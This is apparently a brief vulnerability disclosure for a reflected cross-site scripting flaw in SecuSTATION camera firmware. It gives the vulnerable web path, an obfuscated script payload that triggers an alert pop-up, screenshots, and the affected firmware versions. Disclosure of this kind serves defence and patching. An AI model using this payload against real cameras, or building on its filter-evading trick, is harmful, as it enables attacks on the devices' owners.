# SecureSTATION Reflected XSS vulnerability exists

## Vulnerability details：

##Discoverer: Jiayang Zhou 

​	The path to access the vulnerable device is as follows：http://VulDevice/web/media/

![image-20241217100348501](https://raw.githubusercontent.com/kklzzcun/Camera/main/assets/1.png)

 payload：?<script/>eval(/ale/,source+/rt/,source+/(190)/. source)(/script>

![image-20241217100507713](https://raw.githubusercontent.com/kklzzcun/Camera/main/assets/2.png)

A pop-up window will appear after placing the package.

![image-20241217100543071](https://raw.githubusercontent.com/kklzzcun/Camera/main/assets/4.png)

SecuSTATION Camera V2.5.5.3116-S50-SMA-B20160811A and lower













































































